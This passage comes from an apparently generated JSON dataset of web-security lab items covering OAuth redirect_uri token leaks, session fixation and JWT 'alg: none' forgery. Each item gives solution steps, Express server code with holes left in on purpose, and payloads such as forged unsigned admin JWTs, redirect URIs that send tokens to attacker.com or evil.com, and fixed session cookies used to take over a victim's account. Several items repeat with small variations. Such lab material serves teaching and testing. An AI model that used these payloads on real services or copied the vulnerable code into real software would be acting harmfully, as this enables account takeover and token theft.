      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  }
,
{
    "Lab scenario": "OAuth implicit flow token leak in redirect URI",
    "Lab Description": "The application integrates OAuth2 login using the implicit flow and allows open redirection through the `redirect_uri` parameter. The access token is leaked via URL fragment and reflected in the redirect. To solve: Intercept the OAuth flow and capture Carlos's token using a crafted redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth2 login initiation flow and identify the authorization URL with response_type=token.",
      "Modify the redirect_uri parameter to a malicious endpoint under your control (e.g., https://attacker.com/#access_token=)",
      "Send the modified link to Carlos using the comment feature on the website (assume CSRF vector or social engineering).",
      "When Carlos clicks the link, the access_token fragment will be appended to your site. Capture this with a listener or webhook.site.",
      "Replay the captured token in the Authorization header and access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': { token: 'abc123xyz', role: 'user' } }; app.get('/auth', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type === 'token') { const accessToken = 'abc123xyz'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === users['carlos'].token) return res.send('Account details for carlos'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=&response_type=token",
      "Authorization: Bearer abc123xyz"
    ]
  }
,
{
    "Lab scenario": "Session fixation via insecure session ID reuse in cookie",
    "Lab Description": "The application allows users to set their own session ID via a cookie prior to authentication. Upon login, the session ID is not regenerated. An attacker can set a known session value and trick a victim into logging in using it. To solve: Fix a session ID and use it to hijack Carlos's session after he logs in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, access the site while unauthenticated and manually add a session=attacker123 cookie in the request.",
      "Log in with your own credentials and observe that the session ID remains unchanged.",
      "Send a crafted link to Carlos that sets document.cookie = 'session=attacker123' via reflected XSS or social engineering.",
      "After Carlos logs in, reuse the session=attacker123 cookie and visit /my-account.",
      "If session fixation is successful, the response will include Carlos's account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'secretpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'anon'; sessions[sid] = username; res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos account info'); else res.send('Not authorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attacker123",
      "document.cookie = 'session=attacker123'",
      "POST /login with session=attacker123 then wait for Carlos to login with same session"
    ]
  }
,
{
    "Lab scenario": "JWT tampering using 'alg: none' in Authorization header",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for user authentication and authorizes access via Bearer tokens. The backend relies on the JWT's `alg` field to determine signature verification. The application fails to enforce algorithm restrictions, allowing manipulation of the `alg` field to 'none' and bypassing signature verification. To solve: tamper with your JWT to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite by logging in as a regular user.",
      "Decode the token using jwt.io or Burp Decoder. Change `alg` to `none` and `sub` to `admin`.",
      "Remove the signature portion completely, then base64-encode the modified header and payload.",
      "Replace the Authorization header with the forged token in Postman or Burp Repeater.",
      "Send a GET request to /admin and confirm access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload.sub; if (user === 'admin') return res.send('Welcome admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome admin'); res.status(403).send('Forbidden'); } catch { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  }
,
{
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab's login system is vulnerable to session fixation. Session IDs are accepted via URL parameters and not regenerated upon successful login. The application trusts client-supplied session tokens, enabling an attacker to set a victim's session before login. To solve: set a session token for Carlos, trick him into logging in, then reuse his session to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate a valid session token for yourself using /login?user=attacker.",
      "Craft a phishing URL with ?session=attacker-session-token and send it to Carlos (simulated).",
      "Carlos logs in using the provided URL. The session remains the same post-login.",
      "Use the same session token to access /my-account as Carlos.",
      "Verify that Carlos's account page is accessible with the fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'qwerty123', 'attacker': 'attackpass' }; app.get('/login', (req, res) => { const { user, session } = req.query; if (users[user]) { const sess = session || Math.random().toString(36).substring(2); sessions[sess] = user; res.cookie('session', sess); res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; const user = sessions[sess]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?user=carlos&session=attack123",
      "Cookie: session=attack123",
      "GET /my-account with session=attack123"
    ]
  }
,
{
    "Lab scenario": "OAuth implicit flow misconfiguration with open redirect",
    "Lab Description": "The OAuth implementation in this app uses the implicit grant flow without validating redirect URIs correctly. The app also accepts open redirects. By chaining these issues, an attacker can steal access tokens by injecting a malicious redirect URI. To solve: steal Carlos’s OAuth token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate an OAuth login and intercept the request to /authorize using OWASP ZAP.",
      "Modify the `redirect_uri` parameter to an attacker-controlled URL with an open redirect back to your server.",
      "Host a simple HTTP listener to capture the token fragment.",
      "Send the phishing OAuth link to Carlos (simulated).",
      "Receive Carlos's token and use Postman to send an authenticated request to /profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = { 'carlos': 'token123' }; const openRedirects = ['/redirect?to=http://evil.com']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Invalid response_type'); const parsed = url.parse(redirect_uri); if (!parsed.host) return res.status(400).send('Invalid redirect URI'); const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos profile page'); res.status(403).send('Unauthorized'); }); const PORT = 3002; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/authorize?client_id=xyz&redirect_uri=http://evil.com/redirect?to=http://attacker.com/capture&response_type=token",
      "#access_token=token123",
      "Authorization: Bearer token123"
    ]
  }
,
{
    "Lab scenario": "JWT token manipulation vulnerability in session authorization",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) to manage user sessions. However, it incorrectly validates the token signature due to the use of the 'none' algorithm. The application trusts the user-submitted token without verifying its integrity, enabling privilege escalation via token tampering. To solve: Forge a valid token that grants admin-level access and use it to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT token using Burp Suite's Proxy feature during login.",
      "2. Decode the JWT using jwt.io and observe the algorithm is set to 'HS256'.",
      "3. Change the alg to 'none' and set the payload 'role':'admin'.",
      "4. Remove the JWT signature entirely and re-encode the header and payload.",
      "5. Replace the Authorization header with the forged token in Burp Repeater and access /admin panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret'); res.json({ token }); } else { const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session ID in cookie management",
    "Lab Description": "This lab uses a session cookie to maintain user authentication states. However, the session ID is set before login and is not regenerated upon successful authentication, allowing an attacker to fix a session for a victim before they log in. To solve: Fix a session for Carlos, make him log in, then reuse the session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the login request and observe the Set-Cookie header before authentication.",
      "2. Note the session cookie value and send Carlos a phishing link containing it (simulate via cookie replay).",
      "3. Wait for Carlos to log in (assume passive login simulation).",
      "4. Replay the session ID in a new request with Burp Repeater to access Carlos's authenticated session.",
      "5. Navigate to /my-account using the fixed session cookie to verify the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/></form>'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account details for ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: session=abc123456def789",
      "Cookie: session=fixedsessionidvalue",
      "Cookie: session=carlosSession001"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration in third-party login endpoint",
    "Lab Description": "This lab uses OAuth for federated login through a third-party provider. However, the redirect URI is not strictly validated, allowing an attacker to manipulate the redirection flow and gain access to a valid session. To solve: Exploit the redirect_uri parameter to hijack a session token from the OAuth flow and log in as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate the OAuth login flow and observe the redirect_uri value.",
      "2. Modify the redirect_uri to a domain controlled by you (simulate local endpoint).",
      "3. Capture the OAuth token or code sent to your malicious redirect.",
      "4. Exchange the captured token for a session using the vulnerable /oauth/callback endpoint.",
      "5. Use the session to access /my-account as the victim user."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') { res.cookie('session', 'victim-session'); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.headers.cookie?.split('=')[1]; if (session === 'victim-session') { res.send('Welcome, OAuth user!'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
      "https://vulnerable.site/auth?redirect_uri=http://localhost:1337/hook",
      "https://vulnerable.site/auth?redirect_uri=https://example.com/oauth/exploit"
    ]
  }
,
{
    "Lab scenario": "Session fixation attack in login flow",
    "Lab Description": "The session management in this application fails to regenerate session identifiers after login. The application accepts pre-set session cookies from unauthenticated users and continues to use the same session after successful login. To solve: hijack a logged-in session by fixing the session token prior to user authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request while unauthenticated and note the session cookie issued.",
      "2. Send a phishing link with your pre-issued session ID as a query parameter to the victim.",
      "3. The victim clicks the link, logs in, and reuses your session ID, which is not regenerated after login.",
      "4. Use the same session ID in your browser and navigate to /account.",
      "5. Verify you have access to the victim’s session by confirming the displayed username."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=12345; path=/",
      "https://target-site.com/login?session=12345",
      "POST /login HTTP/1.1 with Cookie: session=12345"
    ]
  }
,
{
    "Lab scenario": "JWT signature bypass in authorization header",
    "Lab Description": "The application uses JWTs for user authentication but fails to validate the signing algorithm securely. It accepts tokens signed using the 'none' algorithm without verifying the signature. The application trusts any decoded payload blindly. To solve: craft a forged JWT that impersonates the admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to capture a request with an Authorization: Bearer <token> header.",
      "2. Decode the JWT using jwt.io and note the algorithm used (likely HS256).",
      "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"user\":\"admin\"}.",
      "4. Remove the signature part of the JWT and send the modified token in the Authorization header.",
      "5. Send a GET request to /admin and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers.authorization; if (authHeader) { const token = authHeader.split(' ')[1]; try { const user = jwt.decode(token); req.user = user; } catch (e) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [spoofed_token]",
      "{\"alg\":\"none\"} + {\"user\":\"admin\"}"
    ]
  }
,
{
    "Lab scenario": "OAuth token leakage in redirect URI handler",
    "Lab Description": "This application uses OAuth for authentication, but its redirect URI handler is improperly configured and does not validate the 'state' parameter. An attacker can perform an open redirect and intercept the access token. To solve: steal the OAuth token issued to Carlos and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register a malicious redirect URI on a phishing domain that you control.",
      "2. Craft an OAuth login link using the original client_id but with your redirect_uri and omit or manipulate the state parameter.",
      "3. Send the crafted link to the victim via email or chat.",
      "4. Once the victim logs in and consents, their token is leaked to your server through the redirect.",
      "5. Use the stolen token in a request to /profile and confirm access to Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'client123'; const REDIRECT_URI = 'http://localhost:4000/oauth/callback'; app.get('/login', (req, res) => { const authURL = `http://authserver.com/auth?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}`; res.redirect(authURL); }); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; req.session = { token: accessToken }; res.send('Logged in'); }); app.get('/profile', (req, res) => { if (!req.session || !req.session.token) return res.status(403).send('Unauthorized'); request.get({ url: 'http://resource-server.com/userinfo', headers: { Authorization: `Bearer ${req.session.token}` } }, (err, resp, body) => { res.send(body); }); }); app.listen(4000);",
    "payloads": [
      "http://authserver.com/auth?client_id=client123&redirect_uri=https://evil.com/callback&response_type=token",
      "https://evil.com/callback#access_token=eyFakeToken123",
      "Authorization: Bearer eyFakeToken123"
    ]
  }
,
{
    "Lab scenario": "JWT signature spoof via algorithm confusion in login API",
    "Lab Description": "The login endpoint accepts JWTs for authentication. The backend library fails to properly validate the 'alg' field, allowing an attacker to switch from a signed algorithm (e.g. HS256) to 'none'. The application trusts the JWT's payload without verifying its authenticity. To solve: Forge a JWT for user 'carlos' using the 'none' algorithm and access the My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the login request using Burp Suite and capture the JWT from a valid login session.",
      "Send the token to Burp Decoder and decode the JWT structure to review its algorithm and payload.",
      "Manually change the algorithm from HS256 to none and set the payload to {\"username\":\"carlos\"}.",
      "Remove the JWT signature part entirely (keep only header and payload) and use the modified token in the Authorization header.",
      "Send a GET request to /my-account with the forged token and confirm unauthorized access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); res.send(`Account details for ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session tokens in login redirect",
    "Lab Description": "The application initializes session tokens before login and fails to regenerate them after successful authentication. The token remains fixed across the login flow. To solve: Set a known session ID before login, then force a victim (Carlos) to authenticate, hijack their session, and access the My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie header value (session ID).",
      "Force this session ID using a crafted request or embed it in a link shared with Carlos (e.g., via email phishing).",
      "Wait for Carlos to authenticate using the fixed session ID, thus binding it to his session.",
      "Replay a request to /my-account using the hijacked session cookie.",
      "Verify successful unauthorized access to Carlos’s page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substr(2); sessions[sid] = { loggedIn: false }; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(403).send('Not logged in'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sid=attackersession",
      "GET /login HTTP/1.1 with sid=attackersession",
      "GET /my-account HTTP/1.1 with sid=attackersession (after Carlos login)"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration leaks authorization code via Referer",
    "Lab Description": "The OAuth implementation leaks sensitive tokens through HTTP Referer headers. The app includes a third-party analytics script which causes unintentional leakage. To solve: Intercept the OAuth flow and extract Carlos’s authorization code from the Referer header when redirected to a malicious domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in to your account and observe the OAuth redirect flow with tools like Burp Suite or OWASP ZAP.",
      "Inject a malicious redirect_uri during the OAuth initiation phase pointing to your server.",
      "Send Carlos a crafted link to initiate OAuth with redirect_uri set to your controlled server.",
      "When Carlos logs in and authorizes the app, capture the HTTP Referer on your server, containing the authorization code.",
      "Exchange the code at the token endpoint to obtain access to Carlos’s protected resource and retrieve /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = authCodes[code]; if (user) { const token = Math.random().toString(36).substring(2); tokens[token] = user; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`Account data for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running'));",
    "payloads": [
      "https://vulnerable.com/oauth/authorize?redirect_uri=https://attacker.com&client_id=abc",
      "Referer: https://attacker.com?code=stolen-code",
      "POST /token with code=stolen-code",
      "Authorization: Bearer <access_token>"
    ]
  }
,
{
    "Lab scenario": "JWT secret key vulnerability in API authentication",
    "Lab Description": "The application's REST API uses JWTs for user authentication but fails to validate tokens securely. It uses a weak, guessable HMAC secret. The application trusts tokens even when re-signed with an attacker-supplied secret. To solve: Forge a valid admin JWT and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT after logging in as a normal user",
      "Verify JWT algorithm using jwt.io and identify usage of 'HS256' with weak signature",
      "Attempt to brute-force the secret key using 'jwt-cracker' or 'jwt_tool'",
      "Forge a new JWT with payload {\"role\": \"admin\"} signed with the discovered key",
      "Use Postman to send a GET /admin request with the forged JWT in Authorization header"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = '123456'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') { return res.send('Welcome admin!'); } else { return res.status(403).send('Not authorized'); } } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Auth Lab running'));",
    "payloads": [
      "header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, payload: { \"user\": \"carlos\", \"role\": \"admin\" }, secret: '123456'",
      "Authorization: Bearer <forged_JWT_token_with_admin_role>"
    ]
  }
,
{
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application does not issue a new session ID upon successful login, allowing session fixation attacks. Attackers can pre-set session tokens and force victims to authenticate using them. To solve: Fixate a session for Carlos, then access his My account page while impersonating him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a session token by visiting the login page",
      "Send a crafted phishing link to Carlos embedding your session ID in the cookie",
      "Wait for Carlos to authenticate using the fixated session ID",
      "Reuse the same session ID to access GET /my-account endpoint",
      "Verify Carlos's account data and capture the response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'swordfish' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Sensitive data for Carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sessionID=attackerSessionID",
      "Session fixation via phishing: http://victim.site/login with pre-set sessionID",
      "Reuse sessionID after victim login to access /my-account"
    ]
  }
,
{
    "Lab scenario": "OAuth redirect manipulation in third-party login",
    "Lab Description": "The application uses OAuth for third-party authentication but fails to validate redirect URIs properly. This allows attackers to manipulate the flow and steal authorization codes. To solve: Hijack the OAuth code and log in as Carlos by exchanging the stolen token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect the OAuth redirect URL during normal login",
      "Observe that redirect_uri is not validated server-side",
      "Modify redirect_uri to point to attacker-controlled server",
      "Wait for Carlos to initiate login and intercept the authorization code",
      "Exchange the code using curl or Postman to obtain Carlos’s access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.example.com/token', { form: { code, redirect_uri, client_id: 'abc', client_secret: 'xyz', grant_type: 'authorization_code' } }, (err, _, body) => { const token = JSON.parse(body).access_token; if (token) res.send('Logged in as: ' + token); else res.send('Auth failed'); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "redirect_uri=https://attacker.com/capture",
      "POST https://oauth.example.com/token with intercepted code and attacker redirect_uri",
      "Access-token: Bearer <token-for-carlos>"
    ]
  }
,
{
    "Lab scenario": "JWT signature spoof via algorithm confusion",
    "Lab Description": "The application's authentication mechanism uses JWTs for session management. The backend accepts JWTs with the 'alg' header set to 'none', allowing attackers to forge tokens without a signature. The application trusts the contents of the JWT without verifying its signature when 'none' is used. To solve: Forge a JWT to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a request with a valid JWT after logging in.",
      "Send the token to Repeater and decode it using jwt.io or any JWT tool.",
      "Replace the 'alg' field in the header with 'none', and manually remove the signature.",
      "Change the payload to {\"username\":\"carlos\"} and re-encode the token.",
      "Set the modified token in the Authorization header and send the request to /my-account to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session ID",
    "Lab Description": "The login endpoint allows the attacker to specify a session ID in a cookie before logging in. The server reuses this session ID after authentication without regenerating it. This allows session fixation attacks. To solve: Set a session ID before Carlos logs in, then hijack his session using the fixed session token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to /login with a crafted session ID cookie using Postman or Burp Repeater.",
      "Forward the session cookie to Carlos via phishing or social engineering simulation.",
      "Wait for Carlos to log in using the fixed session ID.",
      "Use Burp to resend a request with the same session ID and access /my-account.",
      "Verify access to Carlos’s account page using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
